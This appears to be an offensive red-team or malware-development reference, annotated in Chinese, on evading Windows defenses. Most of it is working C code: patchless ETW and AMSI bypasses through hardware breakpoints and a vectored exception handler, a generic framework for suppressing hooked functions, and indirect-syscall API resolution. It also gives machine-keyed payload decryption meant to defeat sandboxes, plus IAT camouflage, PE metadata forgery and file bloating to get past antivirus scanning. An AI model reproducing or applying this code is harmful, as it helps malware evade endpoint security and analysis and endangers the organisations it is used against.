# Defense Evasion Techniques (High-OPSEC Only)

> 所有技术均为 🟢 Low OPSEC，零内存修改 (patchless)。
> **已移除**: ETW Byte Patching (ntdll .text 修改被检测), AMSI Byte Patching (amsi.dll 修改被检测)

---

## 1. ETW Bypass — Patchless via Hardware Breakpoints

> OPSEC: 🟢 Low
> Sysmon: 无 (不修改任何内存)
> ETW: EtwEventWrite 被跳过但无 .text 修改
> EDR Hooks: 无 VirtualProtect 调用，完整性检查通过
> 优势: DR 寄存器是 per-thread，不影响其他线程/进程
> 来源: rad9800/hwbp4mw

```c
// 设置 HWBP 在 EtwEventWrite 入口
// VEH handler 直接返回 STATUS_SUCCESS，跳过函数执行

PVOID g_pEtwEventWrite = NULL;

LONG CALLBACK EtwBypassHandler(PEXCEPTION_POINTERS pEx) {
    if (pEx->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        if ((PVOID)pEx->ContextRecord->Rip == g_pEtwEventWrite) {
            // 设置返回值 = STATUS_SUCCESS (0)
            pEx->ContextRecord->Rax = 0;
            // 跳过函数: RIP = return address (栈顶)
            pEx->ContextRecord->Rip = *(DWORD64*)pEx->ContextRecord->Rsp;
            pEx->ContextRecord->Rsp += 8;
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

void EnableEtwBypass(void) {
    PVOID pNtdll   = PebGetModule(HASH_NTDLL);
    PVOID pKernel  = PebGetModule(HASH_KERNEL32);

    // 1. 解析 EtwEventWrite 地址
    g_pEtwEventWrite = PebGetProc(pNtdll, HASH_EtwEventWrite);

    // 2. 注册 VEH (通过 PEB walk 解析 — 不放入 IAT)
    typedef PVOID(WINAPI* fnAddVectoredExceptionHandler)(ULONG, PVECTORED_EXCEPTION_HANDLER);
    fnAddVectoredExceptionHandler pAVEH = (fnAddVectoredExceptionHandler)
        PebGetProc(pKernel, HASH_AddVectoredExceptionHandler);  // 0x37D1F0D7
    pAVEH(1, EtwBypassHandler);

    // 3. 设置 DR0 = EtwEventWrite (通过 NtGetContextThread / NtSetContextThread)
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    HANDLE hThread = (HANDLE)-2;  // GetCurrentThread() 伪句柄 — 无需 IAT
    SYSCALL_ENTRY ntGetCtx = FindSyscall(pNtdll, HASH_NtGetContextThread);
    IndirectSyscall(&ntGetCtx, hThread, &ctx);
    ctx.Dr0 = (DWORD64)g_pEtwEventWrite;
    ctx.Dr7 = (ctx.Dr7 & ~0xF) | 1;  // DR0 enabled, break on execute
    SYSCALL_ENTRY ntSetCtx = FindSyscall(pNtdll, HASH_NtSetContextThread);
    IndirectSyscall(&ntSetCtx, hThread, &ctx);
}
```

---

### Helper: EnsureModule

```c
// EnsureModule: Load DLL if not already in PEB module list
// Uses LdrLoadDll via indirect syscall to avoid LoadLibraryA IAT entry
__forceinline PVOID EnsureModule(DWORD dwHash, char* szDllName) {
    PVOID hMod = PebGetModule(dwHash);
    if (hMod) return hMod;
    // Fallback: LdrLoadDll (ntdll export, no IAT entry)
    typedef long (__stdcall *tLdrLoadDll)(wchar_t*, unsigned long*, void*, void**);
    tLdrLoadDll pLdr = (tLdrLoadDll)PebGetProc(PebGetModule(HASH_NTDLL), HASH_LdrLoadDll);
    // Convert ANSI to Unicode inline
    wchar_t wDll[64] = {0};
    for (int i = 0; szDllName[i]; i++) wDll[i] = (wchar_t)szDllName[i];
    UNICODE_STRING us; us.Length = us.MaximumLength = (unsigned short)(wcslen(wDll) * 2); us.Buffer = wDll;
    pLdr(NULL, 0, &us, &hMod);
    return hMod;
}
```

---

## 2. AMSI Bypass — Patchless via Hardware Breakpoints

> **Note**: UnifiedBypassHandler replaces Section 1's EtwBypassHandler. Use this when enabling both ETW + AMSI bypass.

> OPSEC: 🟢 Low
> Sysmon: 无
> ETW: AmsiScanBuffer 被跳过但 amsi.dll 完整
> EDR Hooks: 无 VirtualProtect，完整性检查通过
> 优势: 与 ETW bypass 共用 VEH handler，仅多占一个 DR 寄存器
> 来源: rad9800/hwbp4mw

```c
PVOID g_pAmsiScanBuffer = NULL;

// 在同一个 VEH handler 中处理 (扩展 EtwBypassHandler)
LONG CALLBACK UnifiedBypassHandler(PEXCEPTION_POINTERS pEx) {
    if (pEx->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        PVOID rip = (PVOID)pEx->ContextRecord->Rip;
        if (rip == g_pEtwEventWrite || rip == g_pAmsiScanBuffer) {
            // AMSI: 返回 AMSI_RESULT_CLEAN (S_OK = 0)
            // ETW: 返回 STATUS_SUCCESS (0)
            pEx->ContextRecord->Rax = 0;
            pEx->ContextRecord->Rip = *(DWORD64*)pEx->ContextRecord->Rsp;
            pEx->ContextRecord->Rsp += 8;
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

// NOTE: Call EnableEtwBypass() first — it registers UnifiedBypassHandler.
// Or call InitAllBypasses() which handles registration order.
void EnableAmsiBypass(void) {
    PVOID pNtdll = PebGetModule(HASH_NTDLL);

    // 加载 amsi.dll (如果尚未加载)
    wchar_t amsiDll[] = {'a','m','s','i','.','d','l','l',0};
    PVOID hAmsi = EnsureModule(HASH_AMSI, amsiDll);
    g_pAmsiScanBuffer = PebGetProc(hAmsi, HASH_AmsiScanBuffer);

    // 设置 DR1 = AmsiScanBuffer
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    HANDLE hThread = (HANDLE)-2;  // GetCurrentThread() 伪句柄 — 无需 IAT
    SYSCALL_ENTRY ntGetCtx = FindSyscall(pNtdll, HASH_NtGetContextThread);
    IndirectSyscall(&ntGetCtx, hThread, &ctx);
    ctx.Dr1 = (DWORD64)g_pAmsiScanBuffer;
    ctx.Dr7 |= (1 << 2);  // DR1 enabled
    SYSCALL_ENTRY ntSetCtx = FindSyscall(pNtdll, HASH_NtSetContextThread);
    IndirectSyscall(&ntSetCtx, hThread, &ctx);
}
```

---

## 3. hwbp4mw — 通用多断点框架

> **Note**: Hwbp4mwHandler is the generic framework that supersedes Sections 1 and 2. Use this for production — it handles any number of breakpoints with a single VEH handler.

> OPSEC: 🟢 Low
> Sysmon: 无
> ETW: 可同时 bypass 任意数量的函数 (最多 4 个 DR)
> EDR Hooks: 通用框架，可 bypass 任何被 hook 的函数
> 优势: 一个 VEH handler 管理所有 bypass，代码复用
> 来源: rad9800/hwbp4mw

```c
// 通用 HWBP bypass 框架
typedef struct _HWBP_ENTRY {
    PVOID pTarget;       // 目标函数地址
    DWORD64 retValue;   // 伪造的返回值
    BOOL active;
} HWBP_ENTRY;

HWBP_ENTRY g_hwbpTable[4] = {0};  // DR0-DR3

LONG CALLBACK Hwbp4mwHandler(PEXCEPTION_POINTERS pEx) {
    if (pEx->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        for (int i = 0; i < 4; i++) {
            if (g_hwbpTable[i].active &&
                (PVOID)pEx->ContextRecord->Rip == g_hwbpTable[i].pTarget) {
                pEx->ContextRecord->Rax = g_hwbpTable[i].retValue;
                pEx->ContextRecord->Rip = *(DWORD64*)pEx->ContextRecord->Rsp;
                pEx->ContextRecord->Rsp += 8;
                return EXCEPTION_CONTINUE_EXECUTION;
            }
        }
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

void Hwbp4mwAdd(PVOID pNtdll, int drIndex, PVOID pTarget, DWORD64 retValue) {
    g_hwbpTable[drIndex].pTarget = pTarget;
    g_hwbpTable[drIndex].retValue = retValue;
    g_hwbpTable[drIndex].active = TRUE;

    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    HANDLE hThread = (HANDLE)-2;  // GetCurrentThread() 伪句柄 — 无需 IAT
    SYSCALL_ENTRY ntGetCtx = FindSyscall(pNtdll, HASH_NtGetContextThread);
    IndirectSyscall(&ntGetCtx, hThread, &ctx);
    switch (drIndex) {
        case 0: ctx.Dr0 = (DWORD64)pTarget; break;
        case 1: ctx.Dr1 = (DWORD64)pTarget; break;
        case 2: ctx.Dr2 = (DWORD64)pTarget; break;
        case 3: ctx.Dr3 = (DWORD64)pTarget; break;
    }
    ctx.Dr7 |= (1 << (drIndex * 2));  // Enable DRn
    SYSCALL_ENTRY ntSetCtx = FindSyscall(pNtdll, HASH_NtSetContextThread);
    IndirectSyscall(&ntSetCtx, hThread, &ctx);
}

// 使用示例: 同时 bypass ETW + AMSI + DbgUiRemoteBreakin + NtTraceEvent
void InitAllBypasses(void) {
    PVOID pNtdll  = PebGetModule(HASH_NTDLL);
    PVOID pKernel = PebGetModule(HASH_KERNEL32);

    // VEH 注册 — 通过 PEB walk 解析 (不放入 IAT)
    typedef PVOID(WINAPI* fnAddVectoredExceptionHandler)(ULONG, PVECTORED_EXCEPTION_HANDLER);
    fnAddVectoredExceptionHandler pAVEH = (fnAddVectoredExceptionHandler)
        PebGetProc(pKernel, HASH_AddVectoredExceptionHandler);  // 0x37D1F0D7
    pAVEH(1, Hwbp4mwHandler);

    wchar_t amsiDll[] = {'a','m','s','i','.','d','l','l',0};
    PVOID hAmsi = EnsureModule(HASH_AMSI, amsiDll);

    Hwbp4mwAdd(pNtdll, 0, PebGetProc(pNtdll, HASH_EtwEventWrite), 0);
    Hwbp4mwAdd(pNtdll, 1, PebGetProc(hAmsi, HASH_AmsiScanBuffer), 0);
    Hwbp4mwAdd(pNtdll, 2, PebGetProc(pNtdll, HASH_DbgUiRemoteBreakin), 0);
    Hwbp4mwAdd(pNtdll, 3, PebGetProc(pNtdll, HASH_NtTraceEvent), 0);
}
```

---

## 4. DRM-equipped Malware (环境绑定)

> OPSEC: 🟢 Low
> Sysmon: 无特定事件
> ETW: 正常的注册表/WMI 查询
> EDR Hooks: 无 — 仅读取系统信息
> 优势: 沙箱/分析环境无法解密执行，payload 绑定到目标机器
> 来源: 概念来自 APT 实战

```c
// 从目标机器唯一标识派生解密 key
// 沙箱/分析师的机器无法解密 payload

void DeriveKey(PBYTE pKey, DWORD keyLen) {
    // 1. 读取 MachineGUID (每台 Windows 唯一)
    // HKLM\SOFTWARE\Microsoft\Cryptography\MachineGuid
    // 通过 NtOpenKey + NtQueryValueKey (indirect syscall)

    // 2. 读取 CPU brand string (CPUID)
    int cpuInfo[4];
    __cpuid(cpuInfo, 0x80000002);

    // 3. 读取 BIOS serial (GetSystemFirmwareTable)
    // 或 disk serial (NtQueryVolumeInformationFile)

    // 4. 组合所有标识 → SHA256 → 截取为 AES key
    // 只有目标机器能生成正确的 key
    // 沙箱的 MachineGUID/CPU/BIOS 不同 → 解密失败 → 不执行
}

void ExecWithDrm(PBYTE pEncPayload, DWORD payloadLen) {
    BYTE key[32];
    DeriveKey(key, 32);
    // 尝试解密
    AesDecrypt(pEncPayload, payloadLen, key, iv, pDecrypted, &decLen);
    // 验证解密结果 (magic bytes / checksum)
    if (*(DWORD*)pDecrypted != EXPECTED_MAGIC) return; // 错误机器，静默退出
    // 正确机器 → 执行
    ExecFiber(pDecrypted, decLen);
}
```

---

## 5. CRT Library Removal (构建时)

> OPSEC: 🟢 Low
> 检测: 无 — 构建时技术
> 优势: 减小二进制体积，移除 CRT 初始化代码特征

```
MSVC 编译选项:
/ENTRY:main /NODEFAULTLIB /O2 /Os /GS- /GL /LTCG /OPT:REF /OPT:ICF /MERGE:.rdata=.text

替代 CRT 函数:
- memcpy → __movsb
- memset → __stosb
- strlen → 手动循环
- malloc → NtAllocateVirtualMemory (indirect syscall)
```

---

## 6. IAT Camouflage (构建时)

> OPSEC: 🟢 Low
> 检测: 无 — 使 IAT 看起来像合法程序
> 优势: 静态分析无法判断为恶意

```c
// 通过 pragma 强制导入无害函数
#pragma comment(linker, "/INCLUDE:__imp_GetSystemTimeAsFileTime")
#pragma comment(linker, "/INCLUDE:__imp_QueryPerformanceCounter")
#pragma comment(linker, "/INCLUDE:__imp_GetCurrentProcessId")
#pragma comment(linker, "/INCLUDE:__imp_GetCurrentThreadId")
#pragma comment(linker, "/INCLUDE:__imp_IsProcessorFeaturePresent")

// 允许列表 (3-6 个):
// GetSystemTimeAsFileTime, QueryPerformanceCounter,
// GetCurrentProcessId, GetCurrentThreadId,
// IsProcessorFeaturePresent, GetStartupInfoW
```

---

## 7. Binary Metadata Modification (构建时)

> OPSEC: 🟢 Low
> 检测: 无 — 使 PE 看起来像合法软件
> 优势: 绕过基于 PE 元数据的启发式检测

修改项:
- PE TimeDateStamp → 设为合法软件的编译时间
- Rich Header → 移除或替换为合法 VS 版本的 Rich Header
- Section names → 使用标准名称 (.text, .rdata, .data, .rsrc)
- Checksum → 重新计算正确值
- Debug directory → 移除 PDB 路径

```c
// 编译后处理脚本 (Python):
// 1. 修改 TimeDateStamp
// 2. 清除 Rich Header
// 3. 重命名 section (如果有非标准名称)
// 4. 修复 PE Checksum
// 5. 移除 debug directory entry
```

---

## 8. File Bloating (构建时)

> OPSEC: 🟢 Low
> 检测: 无 — 超过 AV 扫描大小限制
> 优势: 许多 AV 引擎跳过 > 100MB 的文件

```c
// 在 .rsrc section 添加大量合法数据
// 方法 1: 嵌入大型合法资源 (图片、字体)
// 方法 2: 编译时添加大型 const 数组
#pragma section(".bloat", read)
__declspec(allocate(".bloat")) const char padding[100*1024*1024] = {
    // 填充英文文本或随机数据 (保持低熵值)
};
```

